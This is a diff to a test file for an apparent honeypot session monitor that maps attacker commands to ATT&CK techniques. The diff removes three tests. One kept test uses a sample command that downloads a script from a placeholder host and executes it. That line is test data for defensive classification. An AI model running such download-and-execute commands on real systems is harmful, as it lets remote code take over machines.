@@ -10,7 +10,7 @@ ROOT = Path(__file__).resolve().parents[1]
 if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
 
-from production.workers.session_monitor import SessionMonitor, SessionState, build_pipeline_trigger
+from production.workers.session_monitor import SessionMonitor
 from production.classification.classification_pipeline import NotebookParityClassifier
 from production.utils.credential_hmac import CredentialHasher
 from production.utils.serialization import session_to_payload
@@ -115,32 +115,6 @@ def test_command_credentials_are_transient_but_not_in_derived_session_payload() 
     )
 
 
-def test_classification_policy_fallback_sources():
-    def high_bert(_cmd):
-        return "T9999", 0.95
-
-    def low_bert(_cmd):
-        return "T9999", 0.10
-
-    securebert_first = SessionMonitor(bert_fn=high_bert)
-    assert securebert_first._classify_with_source("whoami") == (
-        "T9999", "unknown", "securebert", 0.95
-    )
-
-    rules_first = SessionMonitor(
-        bert_fn=high_bert,
-        classification_policy={"strategy": "rules_first"},
-    )
-    assert rules_first._classify_with_source("whoami") == (
-        "T1033", "discovery", "rule", 1.0
-    )
-
-    low_conf = SessionMonitor(bert_fn=low_bert)
-    assert low_conf._classify_with_source("whoami") == (
-        "T1033", "discovery", "rule", 1.0
-    )
-
-
 def test_session_monitor_records_ordered_subcommand_classifications():
     command = "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a"
 
@@ -195,86 +169,12 @@ def test_session_monitor_records_ordered_subcommand_classifications():
     ]
 
 
-def test_enrichment_is_available_before_campaign_registration():
-    enrichment_db = {
-        "203.0.113.10": {
-            "asn": "AS64500",
-            "isp": "Example Transit",
-            "geo": "TH",
-        }
-    }
-    monitor = SessionMonitor(enrichment_db=enrichment_db)
-    monitor.on_event(_command_event())
-    monitor.on_event({
-        "eventid": "cowrie.session.closed",
-        "session": "s1",
-        "src_ip": "203.0.113.10",
-        "timestamp": "2026-05-12T00:00:10Z",
-        "duration": 10,
-    })
-
-    state = monitor.get_session("s1")
-    assert state.asn == "AS64500"
-    assert state.enrichment_status["status"] == "applied"
-    assert monitor.campaign_tracker._profiles[0]["asn"] == "AS64500"
-
-
-def test_pipeline_trigger_adds_data_provenance():
-    class FakeCoordinator:
-        def __init__(self, base_url="", model="", max_tokens=4000):
-            self.max_tokens = max_tokens
-
-        async def analyze(self, *args, **kwargs):
-            return {
-                "confidence": "high",
-                "ai_enriched": False,
-                "confidence_source": "test",
-            }
-
-    state = SessionState(
-        session_id="s-prov",
-        src_ip="203.0.113.10",
-        start_time="2026-05-12T00:00:00Z",
-    )
-    state.commands.append("whoami")
-    state.commands_success.append("whoami")
-    state.ttps.append("T1033")
-    state.tactics.append("discovery")
-    state.ttp_command_map["T1033"] = ["whoami"]
-    state.ttp_sources["T1033"] = ["keyword"]
-    state.classification_policy = {"strategy": "rules_first"}
-    state.credential_metadata = {
-        "credential_observed": True,
-        "raw_password_stored": False,
-        "password_hash_present": True,
-        "raw_events_sanitized": True,
-        "hashing_enabled": True,
-        "password_hash_alias_count": 0,
-        "hash_algorithm": "hmac-sha256-v1",
-        "active_key_id": "unit-key",
-        "correlation_key_ids": [],
-    }
-    state.raw_events.append(_command_event(session="s-prov"))
-
-    trigger = build_pipeline_trigger(FakeCoordinator)
-    result = trigger(state)
-    assert result["data_provenance"]["session"]["session_id"] == "s-prov"
-    assert result["data_provenance"]["classification"]["ttp_sources"]["T1033"] == ["keyword"]
-    credential_metadata = result["data_provenance"]["credential_metadata"]
-    assert credential_metadata["schema_version"] == "credential_metadata.v1"
-    assert credential_metadata["metadata_status"] == "available"
-    assert credential_metadata["raw_password_stored"] is False
-
-
 if __name__ == "__main__":
     tests = [
         test_credentials_are_redacted_and_hashed,
         test_raw_credentials_cannot_be_enabled_in_derived_session_state,
         test_command_credentials_are_transient_but_not_in_derived_session_payload,
-        test_classification_policy_fallback_sources,
         test_session_monitor_records_ordered_subcommand_classifications,
-        test_enrichment_is_available_before_campaign_registration,
-        test_pipeline_trigger_adds_data_provenance,
     ]
     for test in tests:
         test()
